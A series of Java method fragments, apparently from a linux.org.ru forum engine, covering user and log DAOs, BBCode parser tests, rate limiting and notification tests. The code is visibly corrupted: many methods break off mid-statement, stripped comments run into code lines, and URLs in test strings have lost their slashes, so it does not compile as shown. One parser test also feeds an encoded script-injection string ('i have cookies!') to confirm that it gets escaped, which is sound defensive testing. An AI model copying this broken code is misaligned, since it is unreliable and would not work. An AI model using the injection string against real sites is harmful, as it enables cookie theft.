public void acceptNewEmail ( @Nonnull User user , @Nonnull String newEmail ) { jdbcTemplate . update ( " UPDATE users SET email=?, new_email=null WHERE id=? " , newEmail , user . getId ( ) ) ; userLogDao . logAcceptNewEmail ( user , newEmail ) ; } 
public void logAcceptNewEmail ( @Nonnull User user , @Nonnull String newEmail ) { jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
private void rescueMaxcom ( ) throws Exception { final User user = userDao . getUser ( " maxcom " ) ; userDao . updateUser ( user , MAXCOM_NAME , MAXCOM_URL , MAXCOM_EMAIL , MAXCOM_TOWN , MAXCOM_PASS , MAXCOM_INFO ) ; userDao . acceptNewEmail ( user , MAXCOM_EMAIL ) ; } 
private void rescueJB ( ) throws Exception { final User user = userDao . getUser ( " JB " ) ; userDao . updateUser ( user , JB_NAME , JB_URL , JB_EMAIL , JB_TOWN , JB_PASS , JB_INFO ) ; userDao . acceptNewEmail ( user , JB_EMAIL ) ; userDao . unblock ( user , user ) ; } 
public void removeUserInfo ( User user , User moderator ) { String userInfo = getUserInfo ( user ) ; if ( userInfo = = null | | userInfo . trim ( ) . isEmpty ( ) ) { return ; } setUserInfo ( user . getId ( ) , null ) ; changeScore ( user . getId ( ) , - 10 ) ; userLogDao . logResetInfo ( user , moderator , userInfo , - 10 ) ; } 
public void logResetUserpic ( @Nonnull User user , @Nonnull User actionUser , int bonus ) { ImmutableMap < String , Object > options ; if ( bonus ! = 0 ) { options = ImmutableMap . < String , Object > of ( OPTION_BONUS , bonus , OPTION_OLD_USERPIC , user . getPhoto ( ) ) ; } else { options = ImmutableMap . < String , Object > of ( OPTION_OLD_USERPIC , user . getPhoto ( ) ) ; } jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
public void logResetInfo ( @Nonnull User user , @Nonnull User moderator , @Nonnull String userInfo , int bonus ) { jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
public String resetPassword ( User user ) { String password = StringUtil . generatePassword ( ) ; userLogDao . logResetPassword ( user , user ) ; return setPassword ( user , password ) ; } 
public void resetPassword ( User user , User moderator ) { setPassword ( user , StringUtil . generatePassword ( ) ) ; userLogDao . logResetPassword ( user , moderator ) ; } 
public void logResetPassword ( @Nonnull User user , @Nonnull User moderator ) { jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
public void updateUser ( @Nonnull User user , String name , String url , String new_email , String town , @Nullable String password , String info ) { jdbcTemplate . update ( " UPDATE users SET name=?, url=?, new_email=?, town=? WHERE id=? " , name , url , new_email , town , user . getId ( ) ) ; if ( password ! = null ) { setPassword ( user , password ) ; userLogDao . logSetPassword ( user ) ; } setUserInfo ( user . getId ( ) , info ) ; } 
public void logSetPassword ( @Nonnull User user ) { jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
public UserLogItem mapRow ( ResultSet rs , int rowNum ) throws SQLException { return new UserLogItem ( rs . getInt ( " id " ) , 
public DataSourceTransactionManager transactionManager ( DataSource ds ) { return new DataSourceTransactionManager ( ds ) ; } 
public void testLogAcceptEmail ( ) { User user = mock ( User . class ) ; when ( user . getId ( ) ) . thenReturn ( UserDaoIntegrationTest . TEST_ID ) ; when ( user . getEmail ( ) ) . thenReturn ( " old@email " ) ; userLogDao . logAcceptNewEmail ( user , " test@email " ) ; List < UserLogItem > logItems = userLogDao . getLogItems ( user ) ; Assert . assertEquals ( 1 , logItems . size ( ) ) ; UserLogItem item = logItems . get ( 0 ) ; assertNotNull ( item ) ; assertEquals ( UserLogAction . ACCEPT_NEW_EMAIL , item . getAction ( ) ) ; } 
public User apply ( EditHistoryDto input ) { return userDao . getUserCached ( input . getEditor ( ) ) ; } 
public List < PreparedGalleryItem > prepare ( List < GalleryItem > items ) { String htmlPath = configuration . getHTMLPathPrefix ( ) ; ImmutableList . Builder < PreparedGalleryItem > builder = ImmutableList . builder ( ) ; for ( GalleryItem item : items ) { try { ImageInfo iconInfo = new ImageInfo ( htmlPath + item . getImage ( ) . getIcon ( ) ) ; ImageInfo fullInfo = new ImageInfo ( htmlPath + item . getImage ( ) . getOriginal ( ) ) ; builder . add ( new PreparedGalleryItem ( item , userDao . getUserCached ( item . getUserid ( ) ) , iconInfo , fullInfo ) ) ; } catch ( FileNotFoundException e ) { logger . error ( " Image not found! id={}: {} " , item . getImage ( ) . getId ( ) , e . getMessage ( ) ) ; } catch ( BadImageException | IOException e ) { logger . error ( " Bad image id={} " , item . getImage ( ) . getId ( ) , e ) ; } } return builder . build ( ) ; } 
private List < TopicsListItem > prepareTopic ( SqlRowSet rs , int messagesInPage ) { List < TopicsListItem > topicsList = new ArrayList < > ( ) ; while ( rs . next ( ) ) { User author ; author = userDao . getUserCached ( rs . getInt ( " userid " ) ) ; ImmutableList < String > tags = topicTagService . getMessageTagsForTitle ( rs . getInt ( " msgid " ) ) ; TopicsListItem topic = new TopicsListItem ( author , rs , messagesInPage , tags ) ; topicsList . add ( topic ) ; } return topicsList ; } 
public BanInfo mapRow ( ResultSet resultSet , int i ) throws SQLException { Timestamp date = resultSet . getTimestamp ( " bandate " ) ; String reason = resultSet . getString ( " reason " ) ; User moderator = getUser ( resultSet . getInt ( " ban_by " ) ) ; return new BanInfo ( date , reason , moderator ) ; } 
private Map < Integer , User > createIgnoreMap ( Set < Integer > ignoreList ) { Map < Integer , User > ignoreMap = new HashMap < > ( ignoreList . size ( ) ) ; for ( int id : ignoreList ) { ignoreMap . put ( id , userDao . getUserCached ( id ) ) ; } return ignoreMap ; } 
public List < PreparedUserLogItem > prepare ( @Nonnull List < UserLogItem > items ) { return ImmutableList . copyOf ( Lists . transform ( items , new Function < UserLogItem , PreparedUserLogItem > ( ) { 
public PreparedUserLogItem apply ( UserLogItem item ) { return new PreparedUserLogItem ( item , userDao . getUserCached ( item . getActionUser ( ) ) ) ; } 
public void testLogAcceptEmail ( ) { User user = mock ( User . class ) ; when ( user . getId ( ) ) . thenReturn ( UserDaoIntegrationTest . TEST_ID ) ; when ( user . getEmail ( ) ) . thenReturn ( " old@email " ) ; userLogDao . logAcceptNewEmail ( user , " test@email " ) ; List < UserLogItem > logItems = userLogDao . getLogItems ( user , true ) ; Assert . assertEquals ( 1 , logItems . size ( ) ) ; UserLogItem item = logItems . get ( 0 ) ; assertNotNull ( item ) ; assertEquals ( UserLogAction . ACCEPT_NEW_EMAIL , item . getAction ( ) ) ; } 
public void brTest ( ) { assertEquals ( " <p><br></p> " , lorCodeService . parseComment ( " [br] " , false , false ) ) ; } 
public void boldTest ( ) { assertEquals ( " <p><b>hello world</b></p> " , lorCodeService . parseComment ( " [b]hello world[/b] " , false , false ) ) ; } 
public void italicTest ( ) { assertEquals ( " <p><i>hello world</i></p> " , lorCodeService . parseComment ( " [i]hello world[/i] " , false , false ) ) ; } 
public void strikeoutTest ( ) { assertEquals ( " <p><s>hello world</s></p> " , lorCodeService . parseComment ( " [s]hello world[/s] " , false , false ) ) ; } 
public void emphasisTest ( ) { assertEquals ( " <p><strong>hello world</strong></p> " , lorCodeService . parseComment ( " [strong]hello world[/strong] " , false , false ) ) ; } 
public void quoteTest ( ) { assertEquals ( lorCodeService . parseComment ( " [quote]hello world[/quote] " , false , false ) , citeHeader + " <p>hello world</p> " + citeFooter ) ; 
public void quoteParamTest ( ) { assertEquals ( lorCodeService . parseComment ( " [quote=maxcom]hello world[/quote] " , false , false ) , citeHeader + " <p><cite>maxcom</cite></p><p>hello world</p> " + citeFooter ) ; 
public void quoteCleanTest ( ) { assertEquals ( " " , lorCodeService . parseComment ( " [quote][/quote] " , false , false ) ) ; } 
public void urlTest ( ) { assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , lorCodeService . parseComment ( " [url]http:linux.org.ru[/url] " , false , false ) ) ; } 
public void urlParamTest ( ) { assertEquals ( " <p><a href= \" http:linux.org.ru \" >linux</a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru]linux[/url] " , false , false ) ) ; } 
public void urlParamWithTagTest ( ) { assertEquals ( " <p><a href= \" http:linux.org.ru \" ><b>l</b>inux</a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru][b]l[/b]inux[/url] " , false , false ) ) ; } 
public void urlParamWithTagTest2 ( ) { assertEquals ( " <p><a href= \" http:linux.org.ru \" ><b>linux</b></a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru][b]linux[/b][/url] " , false , false ) ) ; } 
public void listTest ( ) { assertEquals ( " <ul><li>one</li><li>two</li><li>three</li></ul> " , lorCodeService . parseComment ( " [list][*]one[*]two[*]three[/list] " , false , false ) ) ; assertEquals ( " <ul><li>one " + " </li><li>two " + " </li><li>three " + " </li></ul> " , lorCodeService . parseComment ( " [list] n[*]one n[*]two n[*]three n[/list] " , false , false ) ) ; assertEquals ( " <ul><li>one " + 
public void codeTest ( ) { assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[list][*]one[*]two[*]three[/list]</code></pre></div> " , lorCodeService . parseComment ( " [code][list][*]one[*]two[*]three[/list][/code] " , false , false ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>simple code</code></pre></div> " , lorCodeService . parseComment ( " [code] nsimple code[/code] " , false , false ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[list][*]one[*]two[*]three[/list]</code></pre></div> " , lorCodeService . parseComment ( " [code] n[list][*]one[*]two[*]three[/list][/code] " , false , false ) ) ; 
public void codeCleanTest ( ) { assertEquals ( " " , lorCodeService . parseComment ( " [code][/code] " , false , false ) ) ; } 
public void codeKnowTest ( ) { assertEquals ( " <div class= \" code \" ><pre class= \" language-cpp \" ><code>#include &lt;stdio.h&gt;</code></pre></div> " , lorCodeService . parseComment ( " [code=cxx]#include <stdio.h>[/code] " , false , false ) ) ; 
public void codeUnKnowTest ( ) { assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>#include &lt;stdio.h&gt;</code></pre></div> " , lorCodeService . parseComment ( " [code=foo]#include <stdio.h>[/code] " , false , false ) ) ; 
public void overflow1Test ( ) { assertEquals ( " <p>ololo</p> " + citeHeader + " <p><i>hz</i></p> " + citeFooter , lorCodeService . parseComment ( " ololo[quote][i]hz[/i][/quote] " , false , false ) ) ; 
public void spacesTest ( ) { assertEquals ( " <p>some text</p><p> some again text <a href= \" http:example.com \" >example</a> example</p> " , lorCodeService . parseComment ( " some text n some again text [url=http:example.com]example[/url] example " , false , false ) ) ; 
public void userTest ( ) { assertEquals ( " <p><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" text-decoration: none \" href= \" http:127.0.0.1:8080/people/maxcom/profile \" >maxcom</a></span></p> " , lorCodeService . parseComment ( " [user]maxcom[/user] " , false , false ) ) ; assertEquals ( " <p><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" text-decoration: none \" href= \" http:127.0.0.1:8080/people/isden/profile \" >isden</a></s></span></p> " , lorCodeService . parseComment ( " [user]isden[/user] " , false , false ) ) ; assertEquals ( " <p><s>hizel</s></p> " , lorCodeService . parseComment ( " [user]hizel[/user] " , false , false ) ) ; 
public void parserResultTest ( ) { String msg = " [user]hizel[/user][user]JB[/user][user]maxcom[/user] " ; Set < User > replier = lorCodeService . getReplierFromMessage ( msg ) ; String html = lorCodeService . parseComment ( msg , true , false ) ; assertTrue ( replier . contains ( maxcom ) ) ; assertTrue ( replier . contains ( JB ) ) ; assertFalse ( replier . contains ( isden ) ) ; assertEquals ( " <p><s>hizel</s><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" text-decoration: none \" href= \" https:127.0.0.1:8080/people/JB/profile \" >JB</a></span><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" text-decoration: none \" href= \" https:127.0.0.1:8080/people/maxcom/profile \" >maxcom</a></span></p> " , html ) ; } 
public void cut4Test ( ) { assertEquals ( " <div id= \" cut0 \" ><p>test</p></div><div id= \" cut1 \" ><p>test</p></div> " , lorCodeService . parseTopic ( " [cut] ntest[/cut][cut]test[/cut] " , false , false ) ) ; 
public void testHighlightURL ( ) { assertEquals ( " <p><a href= \" http:ya.ru/?a=f%3Cscript%3Ealert('i%20have%20cookies!')%3C/script%3E \" >http:ya.ru/?a=f&lt;script&gt;alert('i have cookies!')&lt;/script&gt;</a></p> " , lorCodeService . parseComment ( " http:ya.ru/?a=f%3Cscript%3Ealert('i%20have%20cookies!')%3C/script%3E " , false , false ) ) ; } 
public boolean apply ( String s ) { return isBox ( s ) ; } 
private static Map < String , Object > createDefaultProfile ( ) { Map < String , Object > defaults = new HashMap < > ( ) ; defaults . put ( NEWFIRST_PROPERTY , Boolean . FALSE ) ; defaults . put ( HOVER_PROPERTY , Boolean . TRUE ) ; defaults . put ( STYLE_PROPERTY , " tango " ) ; defaults . put ( FORMAT_MODE_PROPERTY , " quot " ) ; defaults . put ( TOPICS_PROPERTY , 30 ) ; defaults . put ( MESSAGES_PROPERTY , 50 ) ; defaults . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; defaults . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; defaults . put ( AVATAR_PROPERTY , " empty " ) ; defaults . put ( HIDE_ADSENSE_PROPERTY , true ) ; defaults . put ( MAIN_GALLERY_PROPERTY , false ) ; defaults . put ( SHOW_SOCIAL_PROPERTY , true ) ; defaults . put ( " DebugMode " , Boolean . FALSE ) ; main page settings ImmutableList<String> boxes = ImmutableList.of( "ibm", "poll", "top10", "gallery", "tagcloud", "archive" ); defaults.put(BOXES_MAIN2_PROPERTY, boxes); return defaults; } 
public HttpEntity < LoginStatus > loginAjax ( @RequestParam ( " nick " ) final String username , @RequestParam ( " passwd " ) final String password , HttpServletRequest request , HttpServletResponse response ) { UsernamePasswordAuthenticationToken token = new UsernamePasswordAuthenticationToken ( username , password ) ; try { UserDetailsImpl details = ( UserDetailsImpl ) userDetailsService . loadUserByUsername ( username ) ; 
private HttpEntity < LoginStatus > entity ( LoginStatus status ) { HttpHeaders headers = new HttpHeaders ( ) ; headers . add ( " Access-Control-Allow-Origin " , configuration . getMainUrlWithoutSlash ( ) ) ; headers . add ( " Access-Control-Allow-Credentials " , " true " ) ; return new HttpEntity < > ( status , headers ) ; } 
private void doResize ( File uploadedFile ) throws IOException , BadImageException { if ( mainFile . exists ( ) ) { mainFile . delete ( ) ; } FileUtils . moveFile ( uploadedFile , mainFile ) ; boolean error = true ; try { ImageInfo . resizeImage ( mainFile . getAbsolutePath ( ) , iconFile . getAbsolutePath ( ) , ICON_WIDTH ) ; 
public static void resizeImage ( String filename , String iconname , int size ) throws IOException , BadImageException { try { BufferedImage source = ImageIO . read ( new File ( filename ) ) ; 
public int saveNewMessage ( final Topic msg , final User user , String text , final String userAgent , final Group group ) { final int msgid = allocateMsgid ( ) ; String url = msg . getUrl ( ) ; String linktext = msg . getLinktext ( ) ; final String finalUrl = url ; final String finalLinktext = linktext ; jdbcTemplate . execute ( " INSERT INTO topics (groupid, userid, title, url, moderate, postdate, id, linktext, deleted, ua_id, postip) VALUES (?, ?, ?, ?, 'f', CURRENT_TIMESTAMP, ?, ?, 'f', create_user_agent(?),?::inet) " , new PreparedStatementCallback < String > ( ) { @Override public String doInPreparedStatement ( PreparedStatement pst ) throws SQLException , DataAccessException { pst . setInt ( 1 , group . getId ( ) ) ; pst . setInt ( 2 , user . getId ( ) ) ; pst . setString ( 3 , msg . getTitle ( ) ) ; pst . setString ( 4 , finalUrl ) ; pst . setInt ( 5 , msgid ) ; pst . setString ( 6 , finalLinktext ) ; pst . setString ( 7 , userAgent ) ; pst . setString ( 8 , msg . getPostIP ( ) ) ; pst . executeUpdate ( ) ; return null ; } } ) ; insert message text jdbcTemplate.update( "INSERT INTO msgbase (id, message, bbcode) values (?,?, ?)", msgid, text, true ); return msgid; } 
public String doInPreparedStatement ( PreparedStatement pst ) throws SQLException , DataAccessException { pst . setInt ( 1 , group . getId ( ) ) ; pst . setInt ( 2 , user . getId ( ) ) ; pst . setString ( 3 , msg . getTitle ( ) ) ; pst . setString ( 4 , finalUrl ) ; pst . setInt ( 5 , msgid ) ; pst . setString ( 6 , finalLinktext ) ; pst . setString ( 7 , userAgent ) ; pst . setString ( 8 , msg . getPostIP ( ) ) ; pst . executeUpdate ( ) ; return null ; } 
public void addUserRefEvent ( Iterable < User > users , int topicId , int commentId ) { for ( User user : users ) { userEventDao . addEvent ( 
public void addUserRefEvent ( Iterable < User > users , int topicId ) { for ( User user : users ) { userEventDao . addEvent ( 
public void addUserTagEvent ( Iterable < Integer > userIdList , int topicId ) { for ( int userId : userIdList ) { userEventDao . addEvent ( 
public void delete ( Topic message ) throws UserErrorException { jdbcTemplate . update ( updateDeleteMessage , message . getId ( ) ) ; } 
public void deleteTopicEvents ( int topicId , ImmutableSet < String > types ) { for ( String type : types ) { jdbcTemplate . update ( 
public void addReplyEvent ( User parentAuthor , int topicId , int commentId ) { userEventDao . addEvent ( ANSWERS . getType ( ) , 
public List < UserEvent > getRepliesForUser ( User user , boolean showPrivate , int topics , int offset , UserEventFilterEnum eventFilter ) { String eventFilterType = null ; if ( eventFilter ! = ALL ) { eventFilterType = eventFilter . getType ( ) ; } return userEventDao . getRepliesForUser ( user . getId ( ) , showPrivate , topics , offset , eventFilterType ) ; } 
public void processTopicDeleted ( Topic topic ) { userEventDao . deleteTopicEvents ( topic . getId ( ) , ImmutableSet . of ( 
public void testAdd ( ) { createSimpleEvent ( ) ; List < UserEvent > events = userEventDao . getRepliesForUser ( TEST_USER_ID , true , 50 , 0 , null ) ; assertEquals ( 1 , events . size ( ) ) ; } 
private void createSimpleEvent ( ) { userEventDao . addEvent ( UserEventFilterEnum . TAG . toString ( ) , 
public void testAddRemove ( ) { createSimpleEvent ( ) ; List < UserEvent > events = userEventDao . getRepliesForUser ( TEST_USER_ID , true , 50 , 0 , null ) ; assertEquals ( 1 , events . size ( ) ) ; userEventDao . deleteTopicEvents ( TEST_TOPIC_ID , ImmutableSet . of ( UserEventFilterEnum . TAG . getType ( ) ) ) ; List < UserEvent > eventsAfterDelete = userEventDao . getRepliesForUser ( TEST_USER_ID , true , 50 , 0 , null ) ; assertEquals ( 0 , eventsAfterDelete . size ( ) ) ; } 
public void testRemoveSyntax ( ) { userEventDao . deleteTopicEvents ( TEST_TOPIC_ID , ImmutableSet . of ( 
public UserEventDao userLogDao ( ) { return new UserEventDao ( ) ; } 
private synchronized boolean check ( String ip , boolean trusted ) { cleanup ( ) ; if ( hash . containsKey ( ip ) ) { DateTime date = hash . get ( ip ) ; if ( date . plusMillis ( ( trusted ? THRESHOLD_TRUSTED : THRESHOLD ) ) . isAfterNow ( ) ) { return false ; } } hash . put ( ip , new DateTime ( ) ) ; return true ; } 
private synchronized void cleanup ( ) { for ( Iterator < DateTime > i = hash . values ( ) . iterator ( ) ; i . hasNext ( ) ; ) { DateTime date = i . next ( ) ; 
private boolean check ( String ip , boolean trusted ) { DateTime date = hash . getIfPresent ( ip ) ; if ( date ! = null ) { if ( date . plusMillis ( ( trusted ? THRESHOLD_TRUSTED : THRESHOLD ) ) . isAfterNow ( ) ) { return false ; } } hash . put ( ip , new DateTime ( ) ) ; return true ; } 
private boolean check ( Action action , String ip , int threshold ) { String key = action . toString ( ) + ':' + ip ; DateTime date = hash . getIfPresent ( key ) ; if ( date ! = null ) { if ( date . plusMillis ( threshold ) . isAfterNow ( ) ) { return false ; } } hash . put ( key , new DateTime ( ) ) ; return true ; } 
public void checkDuplication ( Action action , String ip , boolean trusted , Errors errors ) { int threshold = trusted ? action . getThresholdTrusted ( ) : action . getThreshold ( ) ; if ( ! check ( action , ip , threshold ) ) { errors . reject ( 
public DeleteCommentResult deleteAllCommentsAndBlock ( User user , final User moderator , String reason ) { userDao . block ( user , moderator , reason ) ; List < Integer > deletedTopicIds = topicService . deleteAllByUser ( user , moderator ) ; List < Integer > deletedCommentIds = commentDao . deleteAllByUser ( user , moderator ) ; return new DeleteCommentResult ( deletedTopicIds , deletedCommentIds , null ) ; } 
public void delete ( int msgid ) { jdbcTemplate . update ( updateDeleteMessage , msgid ) ; } 
private void deleteTopic ( int mid , User moderator , String reason , int bonus ) { topicDao . delete ( mid ) ; deleteInfoDao . insert ( mid , moderator , reason , bonus ) ; userEventService . processTopicDeleted ( mid ) ; } 
public void processTopicDeleted ( int msgid ) { userEventDao . deleteTopicEvents ( msgid , ImmutableSet . of ( 
public static String escapeXml ( String str ) { StringBuilder res = new StringBuilder ( ) ; for ( int i = 0 ; i < str . length ( ) ; i + + ) { switch ( str . charAt ( i ) ) { case '<' : res . append ( " &lt; " ) ; break ; case '>' : res . append ( " &gt; " ) ; break ; case '\"' : res . append ( " &quot; " ) ; break ; case '&' : Matcher m = uniRE . matcher ( str . substring ( i ) ) ; if ( m . find ( ) ) { String s = m . group ( ) ; switch ( s ) { case " &nbsp; " : res . append ( " &#160; " ) ; break ; default : res . append ( s ) ; break ; } i + = s . length ( ) - 1 ; continue ; } else { res . append ( " &amp; " ) ; } break ; default : res . append ( str . charAt ( i ) ) ; } } return res . toString ( ) ; } 
public void processTitle ( ) { given when String actualResult = StringUtil.processTitle("one -- two --- three -- four-- five --six --"); then assertEquals("one&nbsp;&mdash; two --- three&nbsp;&mdash; four-- five --six --", actualResult); } 
public void makeTitle ( ) { given when String actualResult = StringUtil.makeTitle("\"Test of \"quotes '' \"in quotes\" in title\"\""); then assertEquals("&#171;Test of &#8222;quotes &quot; &#8222;in quotes&#8221; in title&#8221;&#187;", actualResult); } 
public void escapeXml ( ) { assertEquals ( " test&#160;test&amp; " , StringUtil . escapeXml ( " test&nbsp;test&amp; " ) ) ; } 
public void insertTopicNotification ( final int topicId , Iterable < Integer > userIds ) { @SuppressWarnings ( " unchecked " ) Map < String , Object > [ ] batch = Iterables . toArray ( Iterables . transform ( userIds , new Function < Integer , Map < String , Object > > ( ) { @Nullable @Override public Map < String , Object > apply ( Integer userId ) { return ImmutableMap . < String , Object > of ( " topic " , topicId , " user " , userId ) ; } } ) , Map . class ) ; insertTopicUsersNotified . executeBatch ( batch ) ; } 
public Map < String , Object > apply ( Integer userId ) { return ImmutableMap . < String , Object > of ( " topic " , topicId , " user " , userId ) ; } 
public void addUserRefEvent ( Iterable < Integer > users , int topicId ) { userEventDao . insertTopicNotification ( topicId , users ) ; for ( int user : users ) { userEventDao . addEvent ( 
public void addUserTagEvent ( Iterable < Integer > userIdList , int topicId ) { userEventDao . insertTopicNotification ( topicId , userIdList ) ; for ( int userId : userIdList ) { userEventDao . addEvent ( 
public void insertTopicNotification ( final int topicId , Iterable < Integer > userIds ) { @SuppressWarnings ( " unchecked " ) Map < String , Object > [ ] batch = Iterables . toArray ( Iterables . transform ( userIds , new Function < Integer , Map < String , Object > > ( ) { @Nullable @Override public Map < String , Object > apply ( Integer userId ) { return ImmutableMap . < String , Object > of ( " topic " , topicId , " userid " , userId ) ; } } ) , Map . class ) ; insertTopicUsersNotified . executeBatch ( batch ) ; } 
public Map < String , Object > apply ( Integer userId ) { return ImmutableMap . < String , Object > of ( " topic " , topicId , " userid " , userId ) ; } 
public void estInsertTopicUserNotification ( ) { userEventDao . insertTopicNotification ( TEST_TOPIC_ID , ImmutableList . of ( TEST_USER_ID ) ) ; } 
public void estInsertTopicUserNotificationDup ( ) { userEventDao . insertTopicNotification ( TEST_TOPIC_ID , ImmutableList . of ( TEST_USER_ID ) ) ; userEventDao . insertTopicNotification ( TEST_TOPIC_ID , ImmutableList . of ( TEST_USER_ID ) ) ; } 
private int createTag ( String tagName ) { SimpleJdbcInsert insert = new SimpleJdbcInsert ( jdbcTemplate ) . withTableName ( " tags_values " ) . usingGeneratedKeyColumns ( " id " ) ; return insert . executeAndReturnKey ( ImmutableMap . < String , Object > of ( " value " , tagName ) ) . intValue ( ) ; } 
public void prepareTestData ( ) { user1Id = createUser ( " UserTagDaoIntegrationTest_user1 " ) ; user2Id = createUser ( " UserTagDaoIntegrationTest_user2 " ) ; tag1Id = createTag ( " UserTagDaoIntegrationTest_tag1 " ) ; tag2Id = createTag ( " UserTagDaoIntegrationTest_tag2 " ) ; tag3Id = createTag ( " UserTagDaoIntegrationTest_tag3 " ) ; tag4Id = createTag ( " UserTagDaoIntegrationTest_tag4 " ) ; tag5Id = createTag ( " UserTagDaoIntegrationTest_tag5 " ) ; } 
public void addTest ( ) { prepareUserTags ( ) ; userTagDao . addTag ( user1Id , tag1Id , false ) ; int result ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_FAVORITE_BY_USER , user1Id ) ; assertEquals ( " Wrong count of user tags. " , 5 , result ) ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_IGNORE_BY_USER , user1Id ) ; assertEquals ( " Wrong count of user tags. " , 3 , result ) ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_FAVORITE_BY_USER , user2Id ) ; assertEquals ( " Wrong count of user tags. " , 5 , result ) ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_IGNORE_BY_USER , user2Id ) ; assertEquals ( " Wrong count of user tags. " , 0 , result ) ; result = jdbcTemplate . queryForInt ( " SELECT count(user_id) FROM user_tags WHERE tag_id=? " , tag1Id ) ; assertEquals ( " Wrong count of user tags. " , 3 , result ) ; } 
public void deleteOneTest ( ) { prepareUserTags ( ) ; userTagDao . deleteTag ( user1Id , tag1Id , true ) ; userTagDao . deleteTag ( user1Id , tag2Id , true ) ; int result ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_FAVORITE_BY_USER , user1Id ) ; assertEquals ( " Wrong count of user tags. " , 3 , result ) ; userTagDao . deleteTag ( user1Id , tag2Id , false ) ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_FAVORITE_BY_USER , user1Id ) ; assertEquals ( " Wrong count of user tags. " , 3 , result ) ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_IGNORE_BY_USER , user1Id ) ; assertEquals ( " Wrong count of user tags. " , 1 , result ) ; } 
public void deleteAllTest ( ) { prepareUserTags ( ) ; userTagDao . deleteTags ( tag2Id ) ; int result ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_FAVORITE_BY_USER , user1Id ) ; assertEquals ( " Wrong count of user tags. " , 4 , result ) ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_IGNORE_BY_USER , user1Id ) ; assertEquals ( " Wrong count of user tags. " , 1 , result ) ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_FAVORITE_BY_USER , user2Id ) ; assertEquals ( " Wrong count of user tags. " , 4 , result ) ; } 
public void replaceTagTest ( ) { int result ; prepareUserTags ( ) ; userTagDao . replaceTag ( tag2Id , tag1Id ) ; result = jdbcTemplate . queryForInt ( " SELECT count(user_id) FROM user_tags WHERE tag_id=? " , tag1Id ) ; assertEquals ( " Wrong count of user tags. " , 2 , result ) ; userTagDao . deleteTags ( tag1Id ) ; userTagDao . replaceTag ( tag2Id , tag1Id ) ; result = jdbcTemplate . queryForInt ( " SELECT count(user_id) FROM user_tags WHERE tag_id=? " , tag1Id ) ; assertEquals ( " Wrong count of user tags. " , 3 , result ) ; } 
public void editCommentTest ( ) { int commentId = jdbcTemplate . queryForInt ( " select nextval('s_msgid') " ) ; addComment ( commentId , null , " CommentDaoIntegrationTest.editCommentTest() " , " CommentDaoIntegrationTest.editCommentTest(): comment body " ) ; Comment oldComment = mock ( Comment . class ) ; when ( oldComment . getId ( ) ) . thenReturn ( commentId ) ; Comment newComment = mock ( Comment . class ) ; when ( newComment . getTitle ( ) ) . thenReturn ( " CommentDaoIntegrationTest.editCommentTest(): new title " ) ; commentDao . edit ( oldComment , newComment , " test body " ) ; List < Map < String , Object > > rows = getComment ( commentId ) ; assertFalse ( " No any records " , rows . isEmpty ( ) ) ; Map < String , Object > row = rows . get ( 0 ) ; assertEquals ( " CommentDaoIntegrationTest.editCommentTest(): new title " , row . get ( " title " ) ) ; rows = jdbcTemplate . queryForList ( " SELECT * FROM msgbase WHERE id=? " , commentId ) ; assertFalse ( " No any records " , rows . isEmpty ( ) ) ; row = rows . get ( 0 ) ; assertEquals ( " test body " , row . get ( " message " ) ) ; } 
public void updateLatestEditorInfoTest ( ) { int commentId = jdbcTemplate . queryForInt ( " select nextval('s_msgid') " ) ; addComment ( commentId , null , " CommentDaoIntegrationTest.updateLatestEditorInfoTest() " , " comment body " ) ; List < Map < String , Object > > rows = getComment ( commentId ) ; assertFalse ( " No any records " , rows . isEmpty ( ) ) ; Map < String , Object > row = rows . get ( 0 ) ; assertNull ( row . get ( " edit_nick " ) ) ; assertNull ( row . get ( " edit_date " ) ) ; assertEquals ( 0 , row . get ( " edit_count " ) ) ; Date commentEditDate = new Date ( ) ; commentDao . updateLatestEditorInfo ( commentId , 1 , commentEditDate , 1234 ) ; rows = getComment ( commentId ) ; assertFalse ( " No any records " , rows . isEmpty ( ) ) ; row = rows . get ( 0 ) ; Timestamp rowTimestamp = ( Timestamp ) row . get ( " edit_date " ) ; assertEquals ( " maxcom " , row . get ( " edit_nick " ) ) ; assertEquals ( rowTimestamp . getTime ( ) , commentEditDate . getTime ( ) ) ; assertEquals ( 1234 , row . get ( " edit_count " ) ) ; } 
